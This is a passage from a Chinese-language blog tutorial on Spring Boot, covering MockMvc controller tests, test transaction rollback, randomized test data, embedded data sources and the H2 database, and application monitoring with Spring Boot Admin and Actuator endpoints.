}\n}\n```\n\n到这里就通过@Import属性实现了基于开发环境的配置基础上，对配置进行测试环境的追加操作。这样我们就可以实现每一个不同的测试用例加载不同的bean的效果，丰富测试用例的编写，同时不影响开发环境的配置。\n\n**总结**\n\n定义测试环境专用的配置类，然后通过@Import注解在具体的测试中导入临时的配置，例如测试用例，方便测试过程，且上述配置不影响其他的测试类环境\n\n### ③Web环境模拟测试\n\n> 当前我们已经可以实现业务层和数据层的测试，并且通过临时配置，控制每个测试用例加载不同的测试数据。但是实际企业开发不仅要保障业务层与数据层的功能安全有效，也要保障控制层的功能正常。那么如何对控制层进行测试呢？\n\n对控制层功能进行测试有三个要点：\n\n- 1.运行测试程序时，必须启动web环境，不然没法测试web功能。\n- 2.必须在测试程序中具备发送web请求的能力，不然无法实现web功能的测试。\n- 3.测试过程必须出现预计值与真实值的比对结果才能确认测试结果是否通过。\n\n因此测试控制层接口这项工作就转换成了三件事\n\n- 1.如何在测试类中启动web测试\n- 2.如何在测试类中发送web请求\n- 3.如何在测试类进行请求结果比对\n\n**测试类中启动web环境**\n\n@SpringBootTest注解带有一个属性，叫做webEnvironment。通过该属性就可以设置在测试用例中启动web环境，具体如下：\n\n```JAVA\n@SpringBootTest(webEnvironment = SpringBootTest.WebEnvironment.RANDOM_PORT)\npublic class WebTest {\t\n}\n```\n\n可以指定启动的Web环境对应的端口，springboot提供了4种设置值，分别如下：\n\n- MOCK：根据当前设置确认是否启动web环境，例如使用了Servlet的API就启动web环境，属于适配性的配置\n- DEFINED_PORT：使用自定义的端口作为web服务器端口\n- RANDOM_PORT：使用随机端口作为web服务器端口\n- NONE：不启动web环境\n\n建议大家测试时使用RANDOM_PORT，避免代码中因为写死设定引发线上功能打包测试时由于端口冲突导致意外现象的出现。\n\n**测试类中发送请求**\n\n**步骤①**：在测试类中开启web虚拟调用功能，通过注解@AutoConfigureMockMvc实现此功能的开启\n\n```java\n@SpringBootTest(webEnvironment = SpringBootTest.WebEnvironment.RANDOM_PORT)\n@AutoConfigureMockMvc //开启虚拟MVC调用\npublic class WebTest {\n}\n```\n\n**步骤②**：定义发起虚拟调用的对象MockMVC，通过自动装配的形式初始化对象\n\n```java\n@SpringBootTest(webEnvironment = SpringBootTest.WebEnvironment.RANDOM_PORT)\n@AutoConfigureMockMvc //开启虚拟MVC调用\npublic class WebTest {\n    @Test\n    void testWeb(@Autowired MockMvc mvc) {\n    }\n}\n```\n\n**步骤③**：创建一个虚拟请求对象，封装请求的路径，并使用MockMVC对象发送对应请求\n\n```java\n@SpringBootTest(webEnvironment = SpringBootTest.WebEnvironment.RANDOM_PORT)\n@AutoConfigureMockMvc //开启虚拟MVC调用\npublic class WebTest {\n    @Test\n    void testWeb(@Autowired MockMvc mvc) throws Exception {\n         //http://localhost:8080/books\n        //创建虚拟请求，当前访问/books\n        MockHttpServletRequestBuilder builder = MockMvcRequestBuilders.get(\"/books\");\n        //执行对应的请求\n        mvc.perform(builder);\n    }\n}\n```\n\n**web环境请求结果比对**\n\n- 响应状态匹配\n\n  ```java\n  @Test\n  void testStatus(@Autowired MockMvc mvc) throws Exception {\n      MockHttpServletRequestBuilder builder = MockMvcRequestBuilders.get(\"/books\");\n      ResultActions action = mvc.perform(builder);\n      //设定预期值 与真实值进行比较，成功测试通过，失败测试失败\n      //定义本次调用的预期值\n      StatusResultMatchers status = MockMvcResultMatchers.status();\n      ResultMatcher ok = status.isOk(); //预计本次调用时成功的：状态200\n      //添加预计值到本次调用过程中进行匹配\n      action.andExpect(ok);\n  }\n  ```\n\n- 响应体匹配（非json数据格式）\n\n  ```java\n  @Test\n  void testBody(@Autowired MockMvc mvc) throws Exception {\n      MockHttpServletRequestBuilder builder = MockMvcRequestBuilders.get(\"/books\");\n      ResultActions action = mvc.perform(builder);\n      //设定预期值 与真实值进行比较，成功测试通过，失败测试失败\n      //定义本次调用的预期值\n      ContentResultMatchers content = MockMvcResultMatchers.content();\n      ResultMatcher result = content.string(\"springboot2\");\n      //添加预计值到本次调用过程中进行匹配\n      action.andExpect(result);\n  }\n  ```\n\n- 响应体匹配（json数据格式，开发中的主流使用方式）\n\n  ```java\n  @Test\n  void testJson(@Autowired MockMvc mvc) throws Exception {\n      MockHttpServletRequestBuilder builder = MockMvcRequestBuilders.get(\"/books\");\n      ResultActions action = mvc.perform(builder);\n      //设定预期值 与真实值进行比较，成功测试通过，失败测试失败\n      //定义本次调用的预期值\n      ContentResultMatchers content = MockMvcResultMatchers.content();\n      ResultMatcher result = content.json(\"{\\\"id\\\":1,\\\"name\\\":\\\"springboot2\\\",\\\"type\\\":\\\"springboot\\\"}\");\n      //添加预计值到本次调用过程中进行匹配\n      action.andExpect(result);\n  }\n  ```\n\n- 响应头信息匹配\n\n  ```java\n  @Test\n  void testContentType(@Autowired MockMvc mvc) throws Exception {\n      MockHttpServletRequestBuilder builder = MockMvcRequestBuilders.get(\"/books\");\n      ResultActions action = mvc.perform(builder);\n      //设定预期值 与真实值进行比较，成功测试通过，失败测试失败\n      //定义本次调用的预期值\n      HeaderResultMatchers header = MockMvcResultMatchers.header();\n      ResultMatcher contentType = header.string(\"Content-Type\", \"application/json\");\n      //添加预计值到本次调用过程中进行匹配\n      action.andExpect(contentType);\n  }\n  ```\n\n头信息，正文信息，状态信息都有了，就可以组合出一个完美的响应结果比对结果了。以下范例就是三种信息同时进行匹配校验，也是一个完整的信息匹配过程。\n\n```java\n@Test\nvoid testGetById(@Autowired MockMvc mvc) throws Exception {\n    MockHttpServletRequestBuilder builder = MockMvcRequestBuilders.get(\"/books\");\n    ResultActions action = mvc.perform(builder);\n    //比状态信息\n    StatusResultMatchers status = MockMvcResultMatchers.status();\n    ResultMatcher ok = status.isOk();\n    action.andExpect(ok);\n    //比对头信息\n    HeaderResultMatchers header = MockMvcResultMatchers.header();\n    ResultMatcher contentType = header.string(\"Content-Type\", \"application/json\");\n    action.andExpect(contentType);\n    //比正文信息\n    ContentResultMatchers content = MockMvcResultMatchers.content();\n    ResultMatcher result = content.json(\"{\\\"id\\\":1,\\\"name\\\":\\\"springboot\\\",\\\"type\\\":\\\"springboot\\\"}\");\n    action.andExpect(result);\n}\n```\n\n**总结**\n\n1. 在测试类中测试web层接口要保障测试类启动时启动web容器，使用@SpringBootTest注解的webEnvironment属性可以虚拟web环境用于测试\n2. 为测试方法注入MockMvc对象，通过MockMvc对象可以发送虚拟请求，模拟web请求调用过程\n3. web虚拟调用可以对本地虚拟请求的返回响应信息进行比对，分为响应头信息比对、响应体信息比对、响应状态信息比对\n\n### ④数据层测试回滚\n\n> 测试用例开发完成后，在打包的阶段由于test生命周期属于必须被运行的生命周期，如果跳过会给系统带来极高的安全隐患，所以测试用例必须执行。但是新的问题就呈现了，测试用例如果测试时产生了事务提交就会在测试过程中对数据库数据产生影响，进而产生垃圾数据。这个过程不是我们希望发生的，\n>\n> 作为开发者希望测试用例正常运行，但是过程中产生的数据不要在我的系统中留痕，这样该如何处理呢？\n\nspringboot早就为开发者想到了这个问题，并且针对此问题给出了最简解决方案，在原始测试用例中添加注解`@Transactional`即可实现当前测试用例的事务不提交。当程序运行后，springboot就会认为这是一个测试程序，无需提交事务，所以也就可以避免事务的提交。\n\n```java\n@SpringBootTest\n@Transactional\n@Rollback(true)\npublic class DaoTest {\n    @Autowired\n    private BookService bookService;\n\n    @Test\n    void testSave(){\n        Book book = new Book();\n        book.setName(\"springboot3\");\n        book.setType(\"springboot3\");\n        book.setDescription(\"springboot3\");\n        bookService.save(book);\n    }\n}\n```\n\n如果开发者想提交事务，也可以，再添加一个@RollBack的注解，设置回滚状态为false「`@RollBack(false)`」即可正常提交事务。\n\n**总结**\n\n1. 在springboot的测试类中通过添加注解@Transactional来阻止测试用例提交事务\n2. 通过注解@Rollback控制springboot测试类执行结果是否提交事务，需要配合注解@Transactional使用\n\n### ⑤测试用例数据设定\n\n测试用例的数据如果固定书写肯定是不合理的，springboot提供了在配置中使用随机值的机制，确保每次运行程序加载的数据都是随机的。具体如下：\n\n```yaml\ntestcase:\n  book:\n    id: ${random.int}           # 随机整数\n    id2: ${random.int(10)}      # 10以内随机整数\n    type: ${random.int(5,10)}   #  10到20随机整数\n    name: ${random.value}       #  随机字符串，MD5字符，32位\n    uuid: ${random.uuid}        #  随机uuid\n    publishTime: ${random.long} #  随机整数（long范围）\n```\n\n当前配置就可以在每次运行程序时创建一组随机数据，避免每次运行时数据都是固定值的尴尬现象发生，有助于测试功能的进行。数据的加载按照之前加载数据的形式，使用@ConfigurationProperties注解即可\n\n```java\n@Component\n@Data\n@ConfigurationProperties(prefix = \"testcase.book\")\npublic class BookCase {\n    private int id;\n    private int id2;\n    private int type;\n    private String name;\n    private String uuid;\n    private long publishTime;\n}\n```\n\n**总结**\n\n使用随机数据可以替换测试用例中书写的固定数据，提高测试用例中的测试数据有效性\n\n## 4.内置数据层\n\n基础篇中用到的数据层解决方案是 Mysql+Druid+MyBatisPlus。而三个技术分别对应了数据层操作的三个层面：\n\n- 数据源技术：Druid\n- 持久化技术：MyBatisPlus\n- 数据库技术：MySQL\n\n那么 SpringBoot 有内置的数据解决方案吗？\n\n### ①数据源技术\n\nspringboot提供了3款内嵌数据源技术，分别如下：\n\n- HikariCP\n  - springboot官方推荐的数据源技术，作为默认内置数据源使用。\n\n- Tomcat提供DataSource\n  - Tomcat提供的DataSource，如果不想用HikartCP，并且使用tomcat作为web服务器进行web程序的开发，使用这个。使用时把HikartCP技术的坐标排除掉就OK了。\n\n- Commons DBCP\n  - 既不使用HikartCP也不使用tomcat的DataSource时，默认给你用这个。\n\n我们之前配置druid时使用druid的starter对应的配置如下：\n\n```YAML\nspring:\n  datasource:\n    druid:\t\n   \t  url: jdbc:mysql://localhost:3306/ssm_db?serverTimezone=UTC\n      driver-class-name: com.mysql.cj.jdbc.Driver\n      username: root\n      password: root\n```\n\n换成是默认的数据源HikariCP后，直接吧druid删掉就行了，如下：\n\n```YAML\nspring:\n  datasource:\n    url: jdbc:mysql://localhost:3306/ssm_db?serverTimezone=UTC\n    driver-class-name: com.mysql.cj.jdbc.Driver\n    username: root\n    password: root\n```\n\n当然，也可以写上是对hikari做的配置，但是url地址要单独配置，如下：\n\n```YAML\nspring:\n  datasource:\n    url: jdbc:mysql://localhost:3306/ssm_db?serverTimezone=UTC\n    hikari:\n      driver-class-name: com.mysql.cj.jdbc.Driver\n      username: root\n      password: root\n```\n\n如果想对hikari做进一步的配置，可以继续配置其独立的属性。例如：\n\n```yaml\nspring:\n  datasource:\n    url: jdbc:mysql://localhost:3306/ssm_db?serverTimezone=UTC\n    hikari:\n      driver-class-name: com.mysql.cj.jdbc.Driver\n      username: root\n      password: root\n      maximum-pool-size: 50\n```\n\n如果不想使用hikari数据源，使用tomcat的数据源或者DBCP配置格式也是一样的。学习到这里，以后我们做数据层时，数据源对象的选择就不再是单一的使用druid数据源技术了，可以根据需要自行选择。\n\n### ②持久化技术\n\nspringboot提供了一套现成的数据层技术，叫做JdbcTemplate。\n\n**步骤①**：导入jdbc对应的starter\n\n```xml\n<dependency>\n    <groupId>org.springframework.boot</groupId>\n    <artifactId>spring-boot-starter-jdbc</artifactId>\n</dependency\n```\n\n**步骤②**：自动装配JdbcTemplate对象\n\n```java\n@SpringBootTest\nclass Springboot15SqlApplicationTests {\n    @Test\n    void testJdbcTemplate(@Autowired JdbcTemplate jdbcTemplate){\n    }\n}\n```\n\n**步骤③**：使用JdbcTemplate实现查询操作（非实体类封装数据的查询操作）\n\n```java\n@Test\nvoid testJdbcTemplate(@Autowired JdbcTemplate jdbcTemplate){\n    String sql = \"select * from tbl_book\";\n    List<Map<String, Object>> maps = jdbcTemplate.queryForList(sql);\n    System.out.println(maps);\n}\n```\n\n**步骤④**：使用JdbcTemplate实现查询操作（实体类封装数据的查询操作）\n\n```java\n@Test\nvoid testJdbcTemplate(@Autowired JdbcTemplate jdbcTemplate){\n\n    String sql = \"select * from tbl_book\";\n    RowMapper<Book> rm = new RowMapper<Book>() {\n        @Override\n        public Book mapRow(ResultSet rs, int rowNum) throws SQLException {\n            Book book = new Book();\n            book.setId(rs.getInt(\"id\"));\n            book.setName(rs.getString(\"name\"));\n            book.setType(rs.getString(\"type\"));\n            book.setDescription(rs.getString(\"description\"));\n            return book;\n        }\n    };\n    List<Book> list = jdbcTemplate.query(sql, rm);\n    System.out.println(list);\n}\n```\n\n**步骤⑤**：使用JdbcTemplate实现增删改操作\n\n```java\n@Test\nvoid testJdbcTemplateSave(@Autowired JdbcTemplate jdbcTemplate){\n    String sql = \"insert into tbl_book values(3,'springboot1','springboot2','springboot3')\";\n    jdbcTemplate.update(sql);\n}\n```\n\n如果想对JdbcTemplate对象进行相关配置，可以在yml文件中进行设定，具体如下：\n\n```yaml\nspring:\n  jdbc:\n    template:\n      query-timeout: -1   # 查询超时时间\n      max-rows: 500       # 最大行数\n      fetch-size: -1      # 缓存行数\n```\n\n### ③数据库技术\n\nspringboot提供了3款内置的数据库，分别是\n\n- H2\n- HSQL\n- Derby\n\n我们一直使用MySQL数据库就挺好的，为什么有需求用这个呢？原因就在于这三个数据库都可以采用内嵌容器的形式运行，在应用程序运行后，如果我们进行测试工作，此时测试的数据无需存储在磁盘上，但是又要测试使用，内嵌数据库就方便了，运行在内存中，该测试测试，该运行运行，等服务器关闭后，一切烟消云散，多好，省得你维护外部数据库了。这也是内嵌数据库的最大优点，方便进行功能测试。三款数据库还可以独立安装。\n\n下面以H2数据库为例讲解如何使用这些内嵌数据库，操作步骤也非常简单，简单才好用嘛\n\n**步骤①**：导入H2数据库对应的坐标，一共2个\n\n```xml\n<dependency>\n    <groupId>com.h2database</groupId>\n    <artifactId>h2</artifactId>\n</dependency>\n<dependency>\n    <groupId>org.springframework.boot</groupId>\n    <artifactId>spring-boot-starter-data-jpa</artifactId>\n</dependency>\n```\n\n**步骤②**：将工程设置为web工程，启动工程时启动H2数据库\n\n```xml\n<dependency>\n    <groupId>org.springframework.boot</groupId>\n    <artifactId>spring-boot-starter-web</artifactId>\n</dependency>\n```\n\n**步骤③**：通过配置开启H2数据库控制台访问程序，也可以使用其他的数据库连接软件操作\n\n```yaml\nspring:\n  h2:\n    console:\n      enabled: true\n      path: /h2\n```\n\nweb端访问路径/h2，访问密码123456，如果访问失败，先配置下列数据源，启动程序运行后再次访问/h2路径就可以正常访问了\n\n```yaml\ndatasource:\n  url: jdbc:h2:~/test\n  hikari:\n    driver-class-name: org.h2.Driver\n    username: sa\n    password: 123456\n```\n\n**步骤④**：使用JdbcTemplate或MyBatisPlus技术操作数据库\n\n其实我们只是换了一个数据库而已，其他的东西都不受影响。一个重要提醒，别忘了，上线时，把内存级数据库关闭，采用MySQL数据库，关闭方式就是设置enabled属性为false即可。\n\n**总结**\n\n现在的可选技术就丰富多了，开发程序时就可以在技术中任选一套数据库解决方案了。\n\n- 数据源技术：Druid、Hikari、tomcat DataSource、DBCP\n- 持久化技术：MyBatisPlus、MyBatis、JdbcTemplate\n- 数据库技术：MySQL、H2、HSQL、Derby\n\n## 5.监控\n\n**监控的意义**\n\n- 监控服务状态是否处理宕机状态\n\n- 监控服务运行指标\n\n- 监控程序运行日志\n\n- 管理服务状态\n\n### ①可视化监控平台\n\n> Spring Boot Admin，这是一个开源社区项目，用于管理和监控SpringBoot应用程序。这个项目中包含有客户端和服务端两部分，而监控平台指的就是服务端。我们做的程序如果需要被监控，将我们做的程序制作成客户端，然后配置服务端地址后，服务端就可以通过HTTP请求的方式从客户端获取对应的信息，并通过UI界面展示对应信息。\n\n#### **服务端开发**\n\n**步骤①**：导入spring-boot-admin对应的starter，版本与当前使用的springboot版本保持一致，并将其配置成web工程，也可通过创建项目时使用勾选的形式完成(Ops/Codecentric's Spring Boot Admin (Server))。\n\n```xml\n<dependency>\n  <groupId>de.codecentric</groupId>\n  <artifactId>spring-boot-admin-starter-server</artifactId>\n  <version>2.7.3</version>\n</dependency>\n\n<dependency>\n    <groupId>org.springframework.boot</groupId>\n    <artifactId>spring-boot-starter-web</artifactId>\n</dependency>\n```\n\n**步骤②**：在引导类上添加注解@EnableAdminServer，声明当前应用启动后作为SpringBootAdmin的服务器使用\n\n```java\n@SpringBootApplication\n@EnableAdminServer\npublic class SpringbootAdminServerApplication {\n    public static void main(String[] args) {\n        SpringApplication.run(SpringbootAdminServerApplication.class, args);\n    }\n}\n```\n\n**步骤③**：运行程序，启动后就可以访问 http://127.0.0.1:8080\n\n![](https://img.jwt1399.top/img/202209141909968.png)\n\n#### **客户端开发**\n\n**步骤①**：导入springboot admin对应的starter，版本与当前使用的springboot版本保持一致，并将其配置成web工程\n\n上述过程也可以通过创建项目时使用勾选的形式完成，不过一定要小心，端口配置成与服务端不一样的，否则会冲突。\n\n```xml\n<dependency>\n    <groupId>de.codecentric</groupId>\n    <artifactId>spring-boot-admin-starter-client</artifactId>\n    <version>2.5.4</version>\n</dependency>\n\n<dependency>\n    <groupId>org.springframework.boot</groupId>\n    <artifactId>spring-boot-starter-web</artifactId>\n</dependency>\n```\n\n**步骤②**：设置当前客户端将信息上传到哪个服务器上，通过yml文件配置\n\n```yaml\nspring:\n  boot:\n    admin:\n      client:\n        url: http://localhost:8080  #服务端url\n```\n\n**步骤③**：运行程序，启动后再次访问服务端程序。\n\n| ![](https://img.jwt1399.top/img/202209142004101.png) | <img src=\"https://img.jwt1399.top/img/202209142004655.png\" /> |\n| ---------------------------------------------------- | ------------------------------------------------------------ |\n\n当前监控了1个程序，点击进去查看详细信息。由于当前没有设置开放哪些信息给监控服务器，所以目前看不到什么有效的信息。下面需要做两组配置就可以看到信息了。\n\n1. 开放指定信息给服务器看\n\n2. 允许服务器以HTTP请求的方式获取对应的信息\n\n\n```yaml\nspring:\n  boot:\n    admin:\n      client:\n        url: http://localhost:8080\nmanagement:\n  endpoint:\n    health:\n      show-details: always # 开放所有的健康信息\n  endpoints:\n    web:\n      exposure:\n        include: \"*\" # 使用*表示查阅全部。记得带引号\n```\n\n配置后再刷新服务器页面，就可以看到所有的信息了。\n\n![](https://img.jwt1399.top/img/202209142006376.png)\n\n以上界面中展示的信息量就非常大了，包含了13组信息，有性能指标监控，加载的bean列表，加载的系统属性，日志的显示控制等等。**还可以配置多个客户端**，通过配置客户端的方式在其他的springboot程序中添加服务端坐标，这样当前服务器就可以监控多个客户端程序了。\n\n进入监控面板，如果你加载的应用具有功能，在监控面板中可以看到3组信息展示的与之前加载的空工程不一样。\n\n- 类加载面板中可以查阅到开发者自定义的类\n\n- 映射中可以查阅到当前应用配置的所有请求\n\n- 性能指标中可以查阅当前应用独有的请求路径统计数据\n\n**总结**\n\n1. 开发监控服务端需要导入坐标，然后在引导类上添加注解@EnableAdminServer，并将其配置成web程序即可\n2. 开发被监控的客户端需要导入坐标，然后配置服务端服务器地址，并做开放指标的设定即可\n3. 在监控平台中可以查阅到各种各样被监控的指标，前提是客户端开放了被监控的指标\n\n### ②监控原理\n\n通过查阅监控中的映射指标，可以看到当前系统中可以运行的所有请求路径，其中大部分路径以/actuator开头\n\n![](https://img.jwt1399.top/img/202209142034874.png)\n\n首先这些请求路径不是开发者自己编写的，其次这个路径代表什么含义呢？既然这个路径可以访问，就可以通过浏览器发送该请求看看究竟可以得到什么信息。\n\n![](https://img.jwt1399.top/img/202209142035573.png)\n\n通过发送请求，可以得到上面json信息，其中每一组数据都有一个请求路径，而在这里请求路径中有之前看到过的health，发送此请求又得到了一组信息\n\n```json\n{\n    \"status\": \"UP\",\n    \"components\": {\n        \"diskSpace\": {\n            \"status\": \"UP\",\n            \"details\": {\n                \"total\": 297042808832,\n                \"free\": 72284409856,\n                \"threshold\": 10485760,\n                \"exists\": true\n            }\n        },\n        \"ping\": {\n            \"status\": \"UP\"\n        }\n    }\n}\n```\n\n当前信息与监控面板中的数据存在着对应关系\n\n<img src=\"https://img.jwt1399.top/img/202209142038284.png\" />\n\n原来监控中显示的信息实际上是通过发送请求后得到json数据，然后展示出来。按照上述操作，可以发送更多的以/actuator开头的链接地址，获取更多的数据，这些数据汇总到一起组成了监控平台显示的所有数据。\n\n到这里我们得到了一个核心信息，监控平台中显示的信息实际上是通过对被监控的应用发送请求得到的。那这些请求谁开发的呢？打开被监控应用的pom文件，其中导入了springboot admin的对应的client，在这个资源中导入了一个名称叫做actuator的包。被监控的应用之所以可以对外提供上述请求路径，就是因为添加了这个包。\n\n![](https://img.jwt1399.top/img/202209142039889.png)\n\n这个actuator是什么呢？这就是本节要讲的核心内容，监控的端点。\n\n> Actuator，可以称为端点，描述了一组监控信息，SpringBootAdmin提供了多个内置端点，通过访问端点就可以获取对应的监控信息，也可以根据需要自定义端点信息。通过发送请求路劲**/actuator**可以访问应用所有端点信息，如果端点中还有明细信息可以发送请求**/actuator/端点名称**来获取详细信息。\n\n| ID               | 描述                                                         | 默认启用 |\n| ---------------- | ------------------------------------------------------------ | -------- |\n| auditevents      | 暴露当前应用程序的审计事件信息。                             | 是       |\n| beans            | 显示应用程序中所有 Spring bean 的完整列表。                  | 是       |\n| caches           | 暴露可用的缓存。                                             | 是       |\n| conditions       | 显示在配置和自动配置类上评估的条件以及它们匹配或不匹配的原因。 | 是       |\n| configprops      | 显示所有 @ConfigurationProperties 的校对清单。               | 是       |\n| env              | 暴露 Spring ConfigurableEnvironment 中的属性。               | 是       |\n| flyway           | 显示已应用的 Flyway 数据库迁移。                             | 是       |\n| health           | 显示应用程序健康信息                                         | 是       |\n| httptrace        | 显示 HTTP 追踪信息（默认情况下，最后 100 个  HTTP 请求/响应交换）。 | 是       |\n| info             | 显示应用程序信息。                                           | 是       |\n| integrationgraph | 显示 Spring Integration 图。                                 | 是       |\n| loggers          | 显示和修改应用程序中日志记录器的配置。                       | 是       |\n| liquibase        | 显示已应用的 Liquibase 数据库迁移。                          | 是       |\n| metrics          | 显示当前应用程序的指标度量信息。                             | 是       |\n| mappings         | 显示所有 @RequestMapping 路径的整理清单。                    | 是       |\n| scheduledtasks   | 显示应用程序中的调度任务。                                   | 是       |\n| sessions         | 允许从 Spring Session 支持的会话存储中检索和删除用户会话。当使用 Spring Session 的响应式 Web 应用程序支持时不可用。 | 是       |\n| shutdown         | 正常关闭应用程序。                                           | 否       |\n| threaddump       | 执行线程 dump。                                              | 是       |\n| heapdump         | 返回一个 hprof 堆 dump 文件。                                | 是       |\n| jolokia          | 通过 HTTP 暴露 JMX bean（当  Jolokia 在 classpath 上时，不适用于 WebFlux）。 | 是       |\n| logfile          | 返回日志文件的内容（如果已设置 logging.file 或 logging.path 属性）。支持使用 HTTP Range 头来检索部分日志文件的内容。 | 是       |\n| prometheus       | 以可以由 Prometheus 服务器抓取的格式暴露指标。               | 是       |\n\n上述端点每一项代表被监控的指标，如果对外开放则监控平台可以查询到对应的端点信息，如果未开放则无法查询对应的端点信息。通过配置可以设置端点是否对外开放功能。使用enable属性控制端点是否对外开放。其中health端点为默认端点，不能关闭。\n\n```yaml\nmanagement:\n  endpoint:\n    health:\t\t\t\t\t\t# 端点名称\n      show-details: always\n    info:\t\t\t\t\t\t  # 端点名称\n      enabled: true\t\t\t\t# 是否开放\n```\n\n为了方便开发者快速配置端点，springboot admin设置了13个较为常用的端点作为默认开放的端点，如果需要控制默认开放的端点的开放状态，可以通过配置设置，如下：\n\n```yaml\nmanagement:\n  endpoints:\n    enabled-by-default: true\t# 是否开启默认端点，默认值true\n```\n\n上述端点开启后，就可以通过端点对应的路径查看对应的信息了。但是此时还不能通过HTTP请求查询此信息，还需要开启通过HTTP请求查询的端点名称，使用“*”可以简化配置成开放所有端点的WEB端HTTP请求权限。\n\n```yaml\nmanagement:\n  endpoints:\n    web:\n      exposure:\n        include: \"*\"\n```\n\n整体上来说，对于端点的配置有两组信息，一组是endpoints开头的，对所有端点进行配置，一组是endpoint开头的，对具体端点进行配置。\n\n```yaml\nmanagement:\n  endpoint:\t\t# 具体端点的配置\n    health:\n      show-details: always\n    info:\n      enabled: true\n  endpoints:\t# 全部端点的配置\n    web:\n      exposure:\n        include: \"*\"\n    enabled-by-default: true\n```\n\n**总结**\n\n1. 被监控客户端通过添加actuator的坐标可以对外提供被访问的端点功能\n\n2. 端点功能的开放与关闭可以通过配置进行控制\n\n3. web端默认无法获取所有端点信息，通过配置开放端点功能\n\n\n### ③自定义监控指标\n\n端点描述了被监控的信息，除了系统默认的指标，还可以自行添加显示的指标，下面就通过3种不同的端点的指标自定义方式来学习端点信息的二次开发。\n\n#### **INFO端点**\n\ninfo端点描述了当前应用的基本信息，可以通过两种形式快速配置info端点的信息\n\n- 配置形式\n\n  在yml文件中通过设置info节点的信息就可以快速配置端点信息\n\n  ```yaml\n  management:\n    info:\n      env:\n        enabled: true\n  info:\n    appName: @project.artifactId@\n    version: @project.version@\n    company: jianjian\n    author: xiaojian\n  ```\n\n  配置完毕后，对应信息显示在监控平台上\n\n![](https://img.jwt1399.top/img/202209142112404.png)\n\n- 编程形式\n\n  通过配置的形式只能添加固定的数据，如果需要动态数据还可以通过配置bean的方式为info端点添加信息，此信息与配置信息共存\n\n  ```java\n  @Component\n  public class InfoConfig implements InfoContributor {\n      @Override\n      public void contribute(Info.Builder builder) {\n          builder.withDetail(\"runTime\",System.currentTimeMillis());\t\t//添加单个信息\n          Map infoMap = new HashMap();\t\t\n          infoMap.put(\"buildTime\",\"2006\");\n          builder.withDetails(infoMap);\t\t\t\t\t\t\t\t\t              //添加一组信息\n      }\n  }\n  ```\n\n#### **Health端点**\n\nhealth端点描述当前应用的运行健康指标，即应用的运行是否成功。通过编程的形式可以扩展指标信息。\n\n```java\n@Component\npublic class HealthConfig extends AbstractHealthIndicator {\n    @Override\n    protected void doHealthCheck(Health.Builder builder) throws Exception {\n        boolean condition = false;\n        if(condition) {\n            builder.status(Status.UP);\t\t\t\t\t//设置运行状态为启动状态\n            builder.withDetail(\"runTime\", System.currentTimeMillis());\n            Map infoMap = new HashMap();\n            infoMap.put(\"buildTime\", \"2006\");\n            builder.withDetails(infoMap);\n        }else{\n            builder.status(Status.OUT_OF_SERVICE);\t\t//设置运行状态为不在服务状态\n            builder.withDetail(\"上线了吗？\",\"你做梦\");\n        }\n    }\n}\n```\n\n当任意一个组件状态不为UP时，整体应用对外服务状态为非UP状态。\n\n![](https://img.jwt1399.top/img/202209142124604.png)\n\n#### **Metrics端点**\n\nmetrics端点描述了性能指标，除了系统自带的监控性能指标，还可以自定义性能指标。\n\n```java\n@Service\npublic class BookServiceImpl extends ServiceImpl<BookDao, Book> implements IBookService {\n    @Autowired\n    private BookDao bookDao;\n\n    private Counter counter;\n\n    public BookServiceImpl(MeterRegistry meterRegistry){\n        counter = meterRegistry.counter(\"用户付费操作次数：\");\n    }\n\n    @Override\n    public boolean delete(Integer id) {\n        //每次执行删除业务等同于执行了付费业务\n        counter.increment();\n        return bookDao.deleteById(id) > 0;\n    }\n}\n```\n\n在性能指标中就出现了自定义的性能指标监控项\n\n![](https://img.jwt1399.top/img/202209142118617.png)\n\n**自定义端点**\n\n可以根据业务需要自定义端点，方便业务监控\n\n```java\n@Component\n@Endpoint(id=\"pay\",enableByDefault = true)\npublic class PayEndpoint {\n    @ReadOperation\n    public Object getPay(){\n        Map payMap = new HashMap();\n        payMap.put(\"level 1\",\"300\");\n        payMap.put(\"level 2\",\"291\");\n        payMap.put(\"level 3\",\"666\");\n        return payMap;\n    }\n}\n```\n\n由于此端点数据spirng boot admin无法预知该如何展示，所以通过界面无法看到此数据，通过HTTP请求路径可以获取到当前端点的信息，但是需要先开启当前端点对外功能，或者设置当前端点为默认开发的端点。\n\n![](https://img.jwt1399.top/img/202209142123262.png)\n\n**总结**\n\n1. 端点的指标可以自定义，但是每种不同的指标根据其功能不同，自定义方式不同\n2. info端点通过配置和编程的方式都可以添加端点指标\n3. health端点通过编程的方式添加端点指标，需要注意要为对应指标添加启动状态的逻辑设定\n4. metrics指标通过在业务中添加监控操作设置指标\n5. 可以自定义端点添加更多的指标\n\n\n\n# Sponsor❤️\n\n您的支持是我不断前进的动力，如果您感觉本文对您有所帮助的话，可以考虑打赏一下本文，用以维持本博客的运营费用，拒绝白嫖，从你我做起！🥰🥰🥰\n\n<table>\n  <tbody>\n     <tr>\n         <td style=\"text-align:center;\">支付宝</td>\n         <td style=\"text-align:center;\">微信</td>\n     </tr>\n   <tr>\n    <td style=\"text-align:center;\" ><img width=\"200\" src=\"https://jwt1399.top/medias/reward/alipay.png\"></td>    \n      <td style=\"text-align:center;\"><img width=\"200\" src=\"https://jwt1399.top/medias/reward/sponor_wechat.png\"></td>     \n  </tr>\n</tbody></table>\n","tags":["SpringBoot"],"categories":["Spring"]},{"title":"SpringBoot-基础篇","url":"/posts/33757.html","content":"\n> 基础篇包含如何创建一个SpringBoot工程、SpringBoot的基础配置语法格式、常见实用技术整合、整合综合应用。\n\n小简从 0 开始学 Java 知识之 [Java-学习路线](https://jwt1399.top/posts/29829.html) 中的《SpringBoot-基础篇》，不定期更新所学笔记，期待一年后的蜕变吧！<有同样想法的小伙伴，可以联系我一起交流学习哦！>\n\n- [x] 🚩时间安排：预计4天更新完\n- [x] 🎯开始时间：09-06\n- [x] 🎉结束时间：09-10\n- [x] 🍀总结：SpringBoot 太好了，再也不需要麻烦的配置啦\n\n\n\n- 学习目标\n\n| 章节                                       | 学习目标                                                  |\n| ------------------------------------------ | --------------------------------------------------------- |\n| <font color=\"#ff0000\"><b>基础篇</b></font> | 能够创建SpringBoot工程<br/>基于SpringBoot实现ssm/ssmp整合 |\n\n- 前置知识\n\n| 章节                                       | 前置知识                   | 要求                                                         |\n| ------------------------------------------ | -------------------------- | ------------------------------------------------------------ |\n| <font color=\"#ff0000\"><b>基础篇</b></font> | Java基础语法               | 面向对象，封装，继承，多态，类与接口，集合，IO，网络编程等   |\n| <font 